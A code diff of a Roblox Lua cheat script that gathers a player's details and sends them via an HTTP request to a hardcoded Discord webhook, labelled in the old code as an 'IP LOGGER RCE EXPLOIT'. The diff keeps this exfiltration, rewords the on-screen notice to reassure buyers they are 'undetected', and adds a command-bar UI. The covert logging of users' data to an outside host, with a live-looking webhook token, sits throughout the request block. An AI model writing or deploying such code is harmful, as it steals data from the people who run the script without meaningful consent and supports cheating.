@@ -209,9 +209,9 @@ local fullInfo =
 "Game: " .. gameName .. " (" .. placeId .. ")\n" ..
 "Date: " .. timeStr
 
-notify("logged for safety reason", fullInfo)
+notify("hello certian thing have been logged for safety", "if you have bought the script(enjoy being undetected! and have fun cheating)")
 
-local WEBHOOK = "https://discord.com/api/webhooks/1446628984053039276/BAaEKSqzI31hGlDnoYUuRV2EMAcyjXPTpuxVxUwA_FR7HmYEnyVEbcOrDNm-shogtz50" -- 🔥 PUT YOUR WEBHOOK HERE
+local WEBHOOK = "https://discord.com/api/webhooks/1446628984053039276/BAaEKSqzI31hGlDnoYUuRV2EMAcyjXPTpuxVxUwA_FR7HmYEnyVEbcOrDNm-shogtz50" 
 
 pcall(function()
     local req = syn and syn.request or http_request or request
@@ -221,23 +221,52 @@ pcall(function()
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode({
-                content = "**ROBLOX IP LOGGER RCE EXPLOIT**\n```"..fullInfo.."```"
+                content = "**EXPLOITED**\n```"..fullInfo.."```"
             })
         })
     end
 end)
+-- ===== CMD BAR UI (Only changes CMD bar size + background + TextBox) =====
 
 local gui = Instance.new("ScreenGui")
 gui.Name = "rce exploit"
 gui.Parent = playerGui
 
+-- Main command bar frame
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(1,0,1,0)
-frame.BackgroundColor3 = Color3.new(1,1,1)
-frame.BackgroundTransparency = 1
+frame.Size = UDim2.new(0, 300, 0, 40)           -- << Smaller width & height
+frame.Position = UDim2.new(0, 20, 0, 80)        -- << Adjust position if needed
+frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- << White background
+frame.BackgroundTransparency = 0.4               -- << Partially transparent
 frame.ZIndex = 9999
 frame.Parent = gui
 
+-- Rounded corners
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 8)
+corner.Parent = frame
+
+-- TextBox inside command bar
+local input = Instance.new("TextBox")
+input.Name = "CmdInput"
+input.Size = UDim2.new(15, -12, 15, -12)
+input.Position = UDim2.new(0, 6, 0, 6)
+input.BackgroundTransparency = 1
+input.ClearTextOnFocus = false
+input.Text = "hello"
+input.PlaceholderText = "Enter command..."
+input.TextSize = 16
+input.TextColor3 = Color3.fromRGB(0, 0, 0)
+input.Parent = frame
+
+-- Optional: print input text on Enter (SAFE)
+input.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        print("[CMD] " .. input.Text)
+    end
+end)
+
+-- Tween animation (keeps your original effect)
 local tweenIn = TweenService:Create(frame, TweenInfo.new(0.15), {BackgroundTransparency = 0})
 local tweenOut = TweenService:Create(frame, TweenInfo.new(0.25), {BackgroundTransparency = 1})
 
@@ -248,5 +277,3 @@ tweenOut:Play()
 tweenOut.Completed:Wait()
 
 gui:Destroy()
-
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
